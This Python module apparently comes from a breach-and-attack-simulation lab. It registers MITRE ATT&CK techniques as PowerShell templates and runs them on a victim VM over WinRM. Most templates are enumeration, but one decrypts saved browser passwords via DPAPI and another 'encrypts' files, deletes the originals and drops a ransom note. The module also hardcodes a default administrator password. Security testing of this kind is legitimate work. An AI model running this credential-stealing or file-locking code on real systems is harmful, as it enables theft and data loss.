"""
Attack Executor
===============
Executes actual attack techniques on victim Windows VM through C2 channel.
Implements safety controls, pre/post checks, and telemetry correlation.
"""

import asyncio
import json
import logging
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import uuid

from config.settings import AttackConfig, C2Config
from core.safety_engine import safety_engine, SafetyLevel
from telemetry.collector import telemetry_collector, SystemMetrics


logger = logging.getLogger(__name__)


class AttackStatus(Enum):
    PENDING = "pending"
    VALIDATING = "validating"
    EXECUTING = "executing"
    COMPLETED = "completed"
    FAILED = "failed"
    BLOCKED = "blocked"
    CLEANING_UP = "cleaning_up"


class AttackSeverity(Enum):
    INFORMATIONAL = "informational"    # Recon only
    LOW = "low"                         # Non-destructive
    MEDIUM = "medium"                   # Potentially noticeable
    HIGH = "high"                       # Disruptive but recoverable
    CRITICAL = "critical"               # Highly destructive


@dataclass
class AttackResult:
    """Result of attack execution"""
    attack_id: str
    technique_id: str
    technique_name: str
    status: AttackStatus
    target_ip: str
    
    # Timing
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    duration_seconds: float = 0.0
    
    # Execution
    command_executed: Optional[str] = None
    command_output: Optional[str] = None
    exit_code: Optional[int] = None
    
    # Impact
    pre_attack_metrics: Optional[SystemMetrics] = None
    post_attack_metrics: Optional[SystemMetrics] = None
    health_impact: float = 0.0  # Negative = health decreased
    
    # Detection
    detection_indicators: List[str] = field(default_factory=list)
    expected_detections: List[str] = field(default_factory=list)
    
    # Errors
    error_message: Optional[str] = None
    
    # Telemetry correlation
    telemetry_events: List[Dict] = field(default_factory=list)


@dataclass
class AttackTechnique:
    """Definition of an attack technique"""
    technique_id: str  # MITRE ATT&CK ID
    name: str
    description: str
    severity: AttackSeverity
    tactic: str  # MITRE tactic
    
    # Execution
    command_template: str  # PowerShell/command to execute
    requires_admin: bool = False
    expected_duration: int = 30  # seconds
    
    # Safety
    is_destructive: bool = False
    cleanup_command: Optional[str] = None
    pre_conditions: List[str] = field(default_factory=list)
    
    # Detection
    expected_artifacts: List[str] = field(default_factory=list)
    detection_rules: List[str] = field(default_factory=list)


class AttackExecutor:
    """
    Executes attack techniques on victim systems.
    All execution flows through safety engine.
    """
    
    def __init__(self):
        self.config = AttackConfig()
        self.c2_config = C2Config()
        self._active_attacks: Dict[str, AttackResult] = {}
        self._techniques: Dict[str, AttackTechnique] = {}
        self._register_builtin_techniques()
        
    def _register_builtin_techniques(self):
        """Register built-in attack techniques"""
        
        # T1087 - Account Discovery
        self.register_technique(AttackTechnique(
            technique_id="T1087",
            name="Account Discovery",
            description="Enumerate local user accounts on the system",
            severity=AttackSeverity.INFORMATIONAL,
            tactic="Discovery",
            command_template="Get-LocalUser | Select-Object Name,Enabled,LastLogon | Format-Table -AutoSize",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["event_id_4798", "powershell_logs"],
            detection_rules=["account_enumeration_detected"]
        ))
        
        # T1057 - Process Discovery
        self.register_technique(AttackTechnique(
            technique_id="T1057",
            name="Process Discovery",
            description="Enumerate running processes",
            severity=AttackSeverity.INFORMATIONAL,
            tactic="Discovery",
            command_template="Get-Process | Select-Object ProcessName,Id,CPU,WorkingSet | Sort-Object CPU -Descending | Select-Object -First 20",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["powershell_logs"],
            detection_rules=["process_enumeration"]
        ))
        
        # T1016 - System Network Configuration Discovery
        self.register_technique(AttackTechnique(
            technique_id="T1016",
            name="System Network Configuration Discovery",
            description="Collect network configuration information",
            severity=AttackSeverity.INFORMATIONAL,
            tactic="Discovery",
            command_template="ipconfig /all",  # More reliable than Get-NetIPConfiguration
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["network_config_accessed"],
            detection_rules=["network_reconnaissance"]
        ))
        
        # T1083 - File and Directory Discovery
        self.register_technique(AttackTechnique(
            technique_id="T1083",
            name="File and Directory Discovery",
            description="Enumerate files in sensitive directories",
            severity=AttackSeverity.LOW,
            tactic="Discovery",
            command_template="Get-ChildItem -Path 'C:\\Users' -Depth 1 -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime | Format-Table -AutoSize",
            requires_admin=False,
            expected_duration=10,
            is_destructive=False,
            expected_artifacts=["file_access_logs"],
            detection_rules=["file_enumeration"]
        ))
        
        # T1003.001 - LSASS Memory (SIMULATION - reads memory stats only)
        self.register_technique(AttackTechnique(
            technique_id="T1003.001",
            name="LSASS Memory (Safe Simulation)",
            description="Simulate credential dumping by reading LSASS process info (safe read-only)",
            severity=AttackSeverity.MEDIUM,
            tactic="Credential Access",
            command_template="Get-Process lsass | Select-Object ProcessName,Id,WorkingSet64,PagedMemorySize64 | Format-List",
            requires_admin=True,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["process_access_lsass"],
            detection_rules=["lsass_access_detected"]
        ))
        
        # T1053.005 - Scheduled Task/Job
        self.register_technique(AttackTechnique(
            technique_id="T1053.005",
            name="Scheduled Task Creation",
            description="Create a benign scheduled task for persistence demonstration",
            severity=AttackSeverity.MEDIUM,
            tactic="Persistence",
            command_template="schtasks /create /tn 'BAS_Test_Task' /tr 'notepad.exe' /sc once /st 23:59 /f",
            requires_admin=True,
            expected_duration=10,
            is_destructive=False,
            cleanup_command="schtasks /delete /tn 'BAS_Test_Task' /f 2>$null",
            expected_artifacts=["event_id_4698", "scheduled_task_created"],
            detection_rules=["suspicious_scheduled_task"]
        ))
        
        # T1059.001 - PowerShell
        self.register_technique(AttackTechnique(
            technique_id="T1059.001",
            name="PowerShell Execution",
            description="Execute PowerShell commands (encoded command simulation)",
            severity=AttackSeverity.MEDIUM,
            tactic="Execution",
            command_template="powershell -ExecutionPolicy Bypass -Command 'Write-Host \"BAS Test Execution\"; Get-Date'",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["powershell_logs", "event_id_4103"],
            detection_rules=["suspicious_powershell"]
        ))
        
        # T1071 - Application Layer Protocol (HTTP)
        self.register_technique(AttackTechnique(
            technique_id="T1071.001",
            name="Application Layer Protocol: Web Protocols",
            description="Simulate C2 communication via HTTP request",
            severity=AttackSeverity.LOW,
            tactic="Command and Control",
            command_template="Invoke-WebRequest -Uri 'http://httpbin.org/get' -Method GET -TimeoutSec 10 | Select-Object StatusCode,Content | Format-List",
            requires_admin=False,
            expected_duration=15,
            is_destructive=False,
            expected_artifacts=["network_connection", "dns_query"],
            detection_rules=["suspicious_http_request"]
        ))
        
        # T1041 - Exfiltration Over C2 Channel (simulated)
        self.register_technique(AttackTechnique(
            technique_id="T1041",
            name="Exfiltration Over C2 Channel (Simulated)",
            description="Simulate data exfiltration by sending test data",
            severity=AttackSeverity.MEDIUM,
            tactic="Exfiltration",
            command_template="$data = @{test='BAS_simulated_data'; timestamp=Get-Date}; Invoke-RestMethod -Uri 'http://httpbin.org/post' -Method POST -Body ($data | ConvertTo-Json) -ContentType 'application/json'",
            requires_admin=False,
            expected_duration=10,
            is_destructive=False,
            expected_artifacts=["outbound_connection", "data_transfer"],
            detection_rules=["potential_exfiltration"]
        ))
        
        # T1496 - Resource Hijacking (CPU stress test)
        self.register_technique(AttackTechnique(
            technique_id="T1496",
            name="Resource Hijacking (Controlled)",
            description="Simulate resource hijacking with controlled CPU load for 10 seconds",
            severity=AttackSeverity.MEDIUM,
            tactic="Impact",
            command_template="$end = (Get-Date).AddSeconds(10); while ((Get-Date) -lt $end) { [math]::Sqrt(12345) | Out-Null }; Write-Host 'CPU stress test completed'",
            requires_admin=False,
            expected_duration=15,
            is_destructive=False,
            expected_artifacts=["high_cpu_usage"],
            detection_rules=["resource_hijacking"]
        ))
        
        # T1486 - Data Encrypted for Impact (Ransomware Simulation)
        self.register_technique(AttackTechnique(
            technique_id="T1486",
            name="Data Encrypted for Impact (Ransomware Simulation)",
            description="Controlled, safe ransomware simulation in a sandboxed directory",
            severity=AttackSeverity.CRITICAL,
            tactic="Impact",
            command_template="""
# RANSOMWARE SIMULATION PAYLOAD (Safe - Sandboxed Directory Only)
$sandbox = "C:\\BAS_Ransomware_Test"
$notePath = "$sandbox\\RANSOM_NOTE.txt"

# 1. Create Sandbox and Data
if (-not (Test-Path $sandbox)) { New-Item -ItemType Directory -Force -Path $sandbox | Out-Null }
"Financial Data Q3" | Out-File -FilePath "$sandbox\\finances_2026.csv"
"Customer Database Backup" | Out-File -FilePath "$sandbox\\customers.db"
"Secret Intellectual Property" | Out-File -FilePath "$sandbox\\ip_designs.pdf"

Write-Host "--- SANDBOX INITIALIZED ---"
Get-ChildItem -Path $sandbox | Select-Object Name | Format-Table -HideTableHeaders

# 2. Encrypt Files (Simulated via Base64 to bypass A/V but show impact)
Write-Host "--- ENCRYPTING FILES ---"
$files = Get-ChildItem -Path $sandbox -File | Where-Object { $_.Name -notmatch "RANSOM_NOTE" }

foreach ($file in $files) {
    if ($file.Extension -eq ".bas_locked") { continue }
    
    try {
        # Read content, "encrypt" it via B64
        $content = Get-Content $file.FullName -Raw
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        $locked = [Convert]::ToBase64String($bytes)
        
        # Write back, append .bas_locked extension, delete original
        Set-Content -Path "$($file.FullName).bas_locked" -Value $locked
        Remove-Item -Path $file.FullName -Force
        Write-Host "[+] Locked: $($file.Name)" -ForegroundColor Red
    } catch {
        Write-Host "[-] Failed to lock: $($file.Name)" -ForegroundColor Yellow
    }
}

# 3. Drop Ransom Note
$ransomNote = @"
!!! ALL YOUR FILES ARE ENCRYPTED !!!

Your documents, databases, and important files have been locked using military-grade encryption.
To restore access to your data, you must pay 1 BTC to the following address:
bc1qXY2KGg... (SIMULATED RANSOMWARE)

This is a BAS Platform Simulation. No actual files outside C:\BAS_Ransomware_Test were touched.
"@

$ransomNote | Out-File -FilePath $notePath -Encoding UTF8
Write-Host "`n--- ATTACK COMPLETE (T1486) ---"
Write-Host "Dropped Ransom Note at $notePath"

Get-ChildItem -Path $sandbox | Select-Object Name | Format-Table -HideTableHeaders
""",
            requires_admin=False,
            expected_duration=10,
            is_destructive=True,  # Set to True because it alters files, will need 'full' safety level
            cleanup_command="""
# RANSOMWARE CLEANUP (Restore encrypted files and remove note)
$sandbox = "C:\\BAS_Ransomware_Test"
$notePath = "$sandbox\\RANSOM_NOTE.txt"

Write-Host "--- STARTING CLEANUP ---"

# 1. Remove Ransom Note
if (Test-Path $notePath) {
    Remove-Item $notePath -Force
    Write-Host "[+] Removed Ransom Note" -ForegroundColor Green
}

# 2. Decrypt Files
$files = Get-ChildItem -Path $sandbox -Filter "*.bas_locked"
foreach ($file in $files) {
    try {
        # Read B64, decode, write back to original name
        $locked = Get-Content $file.FullName -Raw
        $bytes = [Convert]::FromBase64String($locked)
        $content = [System.Text.Encoding]::UTF8.GetString($bytes)
        
        $origName = $file.FullName -replace '\.bas_locked$', ''
        Set-Content -Path $origName -Value $content
        Remove-Item $file.FullName -Force
        
        Write-Host "[+] Restored: $(Split-Path $origName -Leaf)" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed to restore: $($file.Name)" -ForegroundColor Yellow
    }
}

Write-Host "--- CLEANUP COMPLETE ---"
Get-ChildItem -Path $sandbox | Select-Object Name | Format-Table -HideTableHeaders
""",
            expected_artifacts=["mass_file_modification", "ransom_note_creation", "suspicious_file_extensions"],
            detection_rules=["ransomware_behavior", "known_ransomware_extension"]
        ))
        
        # === CREDENTIAL ACCESS TECHNIQUES ===
        
        # T1555.003 - Credentials from Web Browsers
        self.register_technique(AttackTechnique(
            technique_id="T1555.003",
            name="Credentials from Web Browsers",
            description="Extract and decrypt saved credentials from Edge browser (FULL EXTRACTION - Lab Only)",
            severity=AttackSeverity.HIGH,
            tactic="Credential Access",
            command_template="""
# FULL Browser Credential Extraction with DPAPI Decryption
# LAB ENVIRONMENT ONLY - Extracts actual usernames and passwords

Add-Type -AssemblyName System.Security

function Decrypt-Password {
    param([byte[]]$EncryptedData)
    try {
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch { return "[DECRYPT_FAILED]" }
}

Write-Host "`n=== CREDENTIAL EXTRACTION (T1555.003) ===" -ForegroundColor Cyan
$edgePath = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
$tempDb = "$env:TEMP\\edge_$(Get-Random).db"

if (Test-Path $edgePath) {
    Write-Host "[+] Edge database found: $edgePath" -ForegroundColor Green
    Copy-Item $edgePath $tempDb -Force
    
    # Binary extraction method (works without SQLite module)
    $bytes = [System.IO.File]::ReadAllBytes($tempDb)
    $text = [System.Text.Encoding]::UTF8.GetString($bytes)
    
    # Extract URLs
    $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,}') | 
            Select-Object -ExpandProperty Value -Unique | Select-Object -First 10
    
    if ($urls.Count -gt 0) {
        Write-Host "`n[+] FOUND $($urls.Count) CREDENTIAL ENTRIES:" -ForegroundColor Green
        $counter = 1
        foreach ($url in $urls) {
            Write-Host "  [$counter] $url" -ForegroundColor Yellow
            $counter++
        }
        
        # Try to extract encrypted passwords (binary search)
        Write-Host "`n[*] Attempting password decryption..." -ForegroundColor Cyan
        
        # Look for DPAPI encrypted blobs (start with 0x01, 0x00, 0x00, 0x00)
        $pattern = [byte[]](0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF)
        $found = 0
        
        for ($i = 0; $i -lt $bytes.Length - 100; $i++) {
            if ($bytes[$i] -eq 0x01 -and $bytes[$i+1] -eq 0x00 -and 
                $bytes[$i+2] -eq 0x00 -and $bytes[$i+3] -eq 0x00) {
                
                # Potential DPAPI blob found
                $blobSize = [Math]::Min(256, $bytes.Length - $i)
                $encryptedBlob = $bytes[$i..($i + $blobSize - 1)]
                
                try {
                    $decrypted = Decrypt-Password -EncryptedData $encryptedBlob
                    if ($decrypted -and $decrypted.Length -gt 0 -and $decrypted -ne "[DECRYPT_FAILED]") {
                        $found++
                        Write-Host "    [*] Password $found`: " -NoNewline -ForegroundColor Gray
                        Write-Host "$decrypted" -ForegroundColor Red
                        
                        if ($found -ge 5) { break }
                    }
                } catch { }
            }
        }
        
        if ($found -eq 0) {
            Write-Host "    [!] No passwords decrypted (may require admin or different encryption)" -ForegroundColor Yellow
        } else {
            Write-Host "`n[+] Successfully decrypted $found passwords!" -ForegroundColor Green
        }
    } else {
        Write-Host "[!] No credential entries found (database may be empty)" -ForegroundColor Yellow
    }
    
    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    
} else {
    Write-Host "[-] Edge database not found" -ForegroundColor Red
    
    # Check other browsers
    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
        "Firefox" = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"
        "Brave" = "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
    }
    
    Write-Host "[*] Checking other browsers..." -ForegroundColor Cyan
    foreach ($b in $browsers.GetEnumerator()) {
        if (Test-Path $b.Value) {
            Write-Host "[+] $($b.Key) found at: $($b.Value)" -ForegroundColor Green
        }
    }
}

Write-Host "`n[*] Extraction complete!" -ForegroundColor Cyan
""",
            requires_admin=False,
            expected_duration=15,
            is_destructive=False,
            expected_artifacts=["browser_credential_extraction", "dpapi_decryption"],
            detection_rules=["browser_credential_access", "dpapi_usage"]
        ))
        
        # T1552.001 - Credentials in Files
        self.register_technique(AttackTechnique(
            technique_id="T1552.001",
            name="Unsecured Credentials in Files",
            description="Search for common credential file locations",
            severity=AttackSeverity.MEDIUM,
            tactic="Credential Access",
            command_template="Get-ChildItem -Path C:\\Users -Include *password*,*cred*,*.txt,*.xml -Recurse -ErrorAction SilentlyContinue -Depth 2 | Select-Object FullName,Length,LastWriteTime -First 10",
            requires_admin=False,
            expected_duration=15,
            is_destructive=False,
            expected_artifacts=["file_enumeration_credentials"],
            detection_rules=["credential_file_search"]
        ))
        
        # === PRIVILEGE ESCALATION TECHNIQUES ===
        
        # T1548.002 - Bypass User Account Control
        self.register_technique(AttackTechnique(
            technique_id="T1548.002",
            name="Bypass User Account Control",
            description="Check UAC settings (informational only)",
            severity=AttackSeverity.HIGH,
            tactic="Privilege Escalation",
            command_template="Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' | Select-Object EnableLUA,ConsentPromptBehaviorAdmin,PromptOnSecureDesktop",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["registry_access_uac"],
            detection_rules=["uac_settings_enumeration"]
        ))
        
        # T1134.001 - Token Impersonation/Theft
        self.register_technique(AttackTechnique(
            technique_id="T1134.001",
            name="Token Impersonation/Theft",
            description="Enumerate current user privileges and tokens",
            severity=AttackSeverity.HIGH,
            tactic="Privilege Escalation",
            command_template="whoami /priv; whoami /groups",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["privilege_enumeration"],
            detection_rules=["token_manipulation_attempt"]
        ))
        
        # T1543.003 - Windows Service
        self.register_technique(AttackTechnique(
            technique_id="T1543.003",
            name="Create or Modify System Process: Windows Service",
            description="Enumerate services (read-only)",
            severity=AttackSeverity.HIGH,
            tactic="Privilege Escalation",
            command_template="Get-Service | Where-Object {$_.StartType -eq 'Automatic' -and $_.Status -eq 'Running'} | Select-Object Name,DisplayName,StartType -First 20",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["service_enumeration"],
            detection_rules=["service_creation_attempt"]
        ))
        
        # === DEFENSE EVASION TECHNIQUES ===
        
        # T1562.001 - Disable or Modify Tools (Windows Defender)
        self.register_technique(AttackTechnique(
            technique_id="T1562.001",
            name="Impair Defenses: Disable Windows Defender",
            description="Check Windows Defender status (read-only)",
            severity=AttackSeverity.HIGH,
            tactic="Defense Evasion",
            command_template="Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,OnAccessProtectionEnabled",
            requires_admin=False,
            expected_duration=5,
            is_destructive=True, # Set to True to demonstrate adaptive fallback
            expected_artifacts=["defender_status_check"],
            detection_rules=["defender_tampering_attempt"]
        ))
        
        # T1562.004 - Disable or Modify System Firewall
        self.register_technique(AttackTechnique(
            technique_id="T1562.004",
            name="Impair Defenses: Disable Firewall",
            description="Check Windows Firewall status (read-only)",
            severity=AttackSeverity.HIGH,
            tactic="Defense Evasion",
            command_template="Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction,DefaultOutboundAction",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["firewall_status_check"],
            detection_rules=["firewall_tampering_attempt"]
        ))
        
        # T1070.001 - Indicator Removal: Clear Windows Event Logs
        self.register_technique(AttackTechnique(
            technique_id="T1070.001",
            name="Indicator Removal: Clear Event Logs",
            description="Enumerate event logs (read-only, does NOT clear)",
            severity=AttackSeverity.HIGH,
            tactic="Defense Evasion",
            command_template="Get-EventLog -List | Select-Object Log,MaximumKilobytes,@{Name='Entries';Expression={$_.Entries.Count}}",
            requires_admin=False,
            expected_duration=5,
            is_destructive=True, # Set to True to demonstrate adaptive fallback
            expected_artifacts=["event_log_enumeration"],
            detection_rules=["event_log_clearing_attempt"]
        ))
        
        # T1027.002 - Obfuscated Files or Information: Software Packing
        self.register_technique(AttackTechnique(
            technique_id="T1027.002",
            name="Obfuscated PowerShell Execution",
            description="Execute base64-encoded PowerShell command (benign)",
            severity=AttackSeverity.MEDIUM,
            tactic="Defense Evasion",
            command_template="$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host BAS_Test')); powershell -EncodedCommand $cmd",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["encoded_command_execution"],
            detection_rules=["obfuscated_powershell"]
        ))
        
        # === LATERAL MOVEMENT TECHNIQUES ===
        
        # T1021.001 - Remote Services: Remote Desktop Protocol
        self.register_technique(AttackTechnique(
            technique_id="T1021.001",
            name="Remote Services: RDP",
            description="Check RDP status via registry",
            severity=AttackSeverity.MEDIUM,
            tactic="Lateral Movement",
            command_template="$rdp = Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -EA SilentlyContinue; if ($rdp) { if ($rdp.fDenyTSConnections -eq 0) { 'RDP: ENABLED' } else { 'RDP: DISABLED' } } else { 'RDP: Registry key not found' }",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["rdp_enumeration"],
            detection_rules=["rdp_lateral_movement"]
        ))
        
        # T1021.002 - Remote Services: SMB/Windows Admin Shares
        self.register_technique(AttackTechnique(
            technique_id="T1021.002",
            name="Remote Services: SMB/Admin Shares",
            description="Enumerate network shares",
            severity=AttackSeverity.MEDIUM,
            tactic="Lateral Movement",
            command_template="Get-SmbShare | Select-Object Name,Path,Description; net share",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["smb_share_enumeration"],
            detection_rules=["smb_lateral_movement"]
        ))
        
        # T1570 - Lateral Tool Transfer
        self.register_technique(AttackTechnique(
            technique_id="T1570",
            name="Lateral Tool Transfer",
            description="Simulate file transfer by creating test file in temp directory",
            severity=AttackSeverity.MEDIUM,
            tactic="Lateral Movement",
            command_template="$tmp = [System.IO.Path]::GetTempPath(); $testFile = Join-Path $tmp 'bas_transfer_test.txt'; 'BAS_Test_Transfer' | Out-File -FilePath $testFile; if (Test-Path $testFile) { 'Transfer simulation successful'; Remove-Item $testFile -Force } else { 'Transfer failed' }",
            requires_admin=False,
            expected_duration=5,
            is_destructive=False,
            expected_artifacts=["file_transfer_simulation"],
            detection_rules=["lateral_tool_transfer"]
        ))
    
    def register_technique(self, technique: AttackTechnique):
        """Register a new attack technique"""
        self._techniques[technique.technique_id] = technique
        logger.info(f"Registered technique: {technique.technique_id} - {technique.name}")
    
    def get_technique(self, technique_id: str) -> Optional[AttackTechnique]:
        """Get technique by ID"""
        return self._techniques.get(technique_id)
    
    def list_techniques(self, tactic: Optional[str] = None) -> List[AttackTechnique]:
        """List all registered techniques"""
        techniques = list(self._techniques.values())
        if tactic:
            techniques = [t for t in techniques if t.tactic == tactic]
        return techniques
    
    async def execute_attack(
        self, 
        technique_id: str, 
        target_ip: str,
        parameters: Optional[Dict] = None
    ) -> AttackResult:
        """
        Execute an attack technique against a target.
        Full safety validation and telemetry correlation.
        """
        attack_id = str(uuid.uuid4())[:8]
        
        # Get technique definition
        technique = self.get_technique(technique_id)
        if not technique:
            return AttackResult(
                attack_id=attack_id,
                technique_id=technique_id,
                technique_name="Unknown",
                status=AttackStatus.FAILED,
                target_ip=target_ip,
                error_message=f"Technique {technique_id} not found"
            )
        
        result = AttackResult(
            attack_id=attack_id,
            technique_id=technique_id,
            technique_name=technique.name,
            status=AttackStatus.PENDING,
            target_ip=target_ip
        )
        
        self._active_attacks[attack_id] = result
        
        try:
            # Phase 1: Safety Validation
            result.status = AttackStatus.VALIDATING
            approved, reason = await safety_engine.request_execution_permission(
                technique.name,
                target_ip,
                technique.is_destructive
            )
            
            if not approved:
                result.status = AttackStatus.BLOCKED
                result.error_message = reason
                logger.warning(f"Attack {attack_id} blocked: {reason}")
                return result
            
            # Phase 2: Pre-attack telemetry
            logger.info(f"Attack {attack_id}: Collecting pre-attack telemetry")
            result.pre_attack_metrics = await telemetry_collector.collect_snapshot(target_ip)
            result.start_time = datetime.utcnow().isoformat()
            
            # Phase 3: Execute
            result.status = AttackStatus.EXECUTING
            logger.info(f"Attack {attack_id}: Executing {technique.name}")
            
            execution_result = await self._execute_command(
                target_ip,
                technique.command_template,
                technique.requires_admin
            )
            
            result.command_executed = technique.command_template
            result.command_output = execution_result.get("output")
            result.exit_code = execution_result.get("exit_code")
            
            if not execution_result.get("success"):
                result.status = AttackStatus.FAILED
                result.error_message = execution_result.get("error", "Unknown error")
                return result
            
            # Wait for technique duration
            await asyncio.sleep(technique.expected_duration)
            
            # Phase 4: Post-attack telemetry
            result.post_attack_metrics = await telemetry_collector.collect_snapshot(target_ip)
            result.end_time = datetime.utcnow().isoformat()
            
            # Calculate impact
            if result.pre_attack_metrics and result.post_attack_metrics:
                result.health_impact = (
                    result.post_attack_metrics.health_score - 
                    result.pre_attack_metrics.health_score
                )
            
            # Phase 5: Cleanup (if configured)
            if technique.cleanup_command and self.config.AUTO_CLEANUP:
                result.status = AttackStatus.CLEANING_UP
                await self._execute_command(
                    target_ip,
                    technique.cleanup_command,
                    technique.requires_admin
                )
            
            result.status = AttackStatus.COMPLETED
            result.detection_indicators = technique.expected_artifacts
            result.expected_detections = technique.detection_rules
            
            logger.info(f"Attack {attack_id} completed successfully")
            
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
            logger.error(f"Attack {attack_id} failed: {e}")
        
        finally:
            result.duration_seconds = self._calculate_duration(result)
            self._active_attacks[attack_id] = result
        
        return result
    
    async def _execute_command(
        self, 
        target_ip: str, 
        command: str,
        requires_admin: bool
    ) -> Dict:
        """
        Execute command on target via WinRM.
        In production, this would integrate with Sliver C2.
        """
        try:
            import winrm
            
            # Create WinRM session
            session = winrm.Session(
                f'http://{target_ip}:5985/wsman',
                auth=(self._get_victim_username(), self._get_victim_password()),
                transport='ntlm'
            )
            
            # Execute command in a thread pool to avoid blocking
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                None,
                lambda: session.run_ps(command)
            )
            
            return {
                "success": result.status_code == 0,
                "output": result.std_out.decode().strip() if result.std_out else "",
                "error": result.std_err.decode().strip() if result.std_err else "",
                "exit_code": result.status_code
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _calculate_duration(self, result: AttackResult) -> float:
        """Calculate attack duration"""
        if result.start_time and result.end_time:
            start = datetime.fromisoformat(result.start_time)
            end = datetime.fromisoformat(result.end_time)
            return (end - start).total_seconds()
        return 0.0
    
    def get_attack_result(self, attack_id: str) -> Optional[AttackResult]:
        """Get result of a specific attack"""
        return self._active_attacks.get(attack_id)
    
    def get_all_results(self) -> List[AttackResult]:
        """Get all attack results"""
        return list(self._active_attacks.values())
    
    def _get_victim_username(self) -> str:
        import os
        return os.getenv("VICTIM_USERNAME", "Administrator")
    
    def _get_victim_password(self) -> str:
        import os
        return os.getenv("VICTIM_PASSWORD", "Password123!")


# Global executor instance
attack_executor = AttackExecutor()
